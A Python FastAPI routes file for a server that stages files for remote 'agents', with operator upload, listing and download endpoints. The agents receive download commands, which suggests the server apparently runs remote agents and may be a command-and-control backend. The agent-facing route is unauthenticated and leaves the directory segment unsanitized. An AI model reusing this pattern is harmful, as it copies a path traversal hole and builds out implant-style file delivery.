"""
File Management Routes
Handles file uploads, downloads, and serving files to/from agents
"""

import os
import shutil
from pathlib import Path
from typing import Dict
from fastapi import APIRouter, HTTPException, UploadFile, File, Depends
from fastapi.responses import FileResponse

from core.agent import Agent
from config import agents, UPLOAD_DIR, MAX_FILE_SIZE
from dependencies import get_current_user


router = APIRouter(prefix="", tags=["files"])


@router.get("/files/{agent_dir}/{filename}")
async def serve_file(agent_dir: str, filename: str):
    """
    Serve a file for agent download
    This is called by the agent when executing a 'download' command
    URL format: /files/agent_{agent_id}/{filename}
    """
    # Sanitize filename to prevent path traversal
    safe_filename = Path(filename).name

    # Construct file path
    file_path = UPLOAD_DIR / agent_dir / safe_filename

    if not file_path.exists():
        raise HTTPException(status_code=404, detail=f"File {safe_filename} not found")

    # Extract agent_id from agent_dir (format: agent_123456)
    if agent_dir.startswith("agent_"):
        try:
            agent_id = int(agent_dir.split("_")[1])
            if agent_id in agents:
                ag: Agent = agents[agent_id]
                ag.add_downloaded_file(safe_filename)
        except (ValueError, IndexError):
            pass  # Invalid format, just serve the file without tracking

    return FileResponse(
        path=str(file_path),
        filename=safe_filename,
        media_type='application/octet-stream'
    )


@router.get("/files/{agent_id}")
def list_agent_files(agent_id: int, user: Dict = Depends(get_current_user)):
    """List all files available for an agent"""
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")

    agent_dir = UPLOAD_DIR / f"agent_{agent_id}"

    if not agent_dir.exists():
        return {'files': []}

    files = []
    for file_path in agent_dir.iterdir():
        if file_path.is_file():
            files.append({
                'filename': file_path.name,
                'size': os.path.getsize(file_path)
            })

    return {'files': files}


@router.get("/dashboard/files/{agent_id}/{filename}")
def dashboard_download_file(agent_id: int, filename: str, user: Dict = Depends(get_current_user)):
    """
    Protected endpoint for dashboard users to download files
    This endpoint requires authentication and is used by the frontend
    URL format: /dashboard/files/{agent_id}/{filename}
    """
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")

    # Sanitize filename to prevent path traversal
    safe_filename = Path(filename).name

    # Construct file path
    agent_dir = UPLOAD_DIR / f"agent_{agent_id}"
    file_path = agent_dir / safe_filename

    if not file_path.exists():
        raise HTTPException(status_code=404, detail=f"File {safe_filename} not found")

    return FileResponse(
        path=str(file_path),
        filename=safe_filename,
        media_type='application/octet-stream'
    )


@router.post("/upload_for_agent/{agent_id}")
async def upload_file_for_agent(agent_id: int, file: UploadFile = File(...), user: Dict = Depends(get_current_user)):
    """
    Server operator uploads a file that an agent can download later
    Use this to stage files, then create a download command
    """
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")

    # Sanitize filename
    safe_filename = Path(file.filename).name

    # Create agent-specific directory
    agent_dir = UPLOAD_DIR / f"agent_{agent_id}"
    agent_dir.mkdir(exist_ok=True)

    # Check file size
    file.file.seek(0, 2)
    file_size = file.file.tell()
    file.file.seek(0)

    if file_size > MAX_FILE_SIZE:
        raise HTTPException(status_code=413, detail=f"File too large (max {MAX_FILE_SIZE // (1024*1024)}MB)")

    # Save the uploaded file
    file_path = agent_dir / safe_filename
    with open(file_path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)

    return {
        'status': True,
        'filename': safe_filename,
        'size': file_size,
        'message': f'File ready for agent {agent_id} to download',
        'download_url': f'/files/agent_{agent_id}/{safe_filename}'
    }
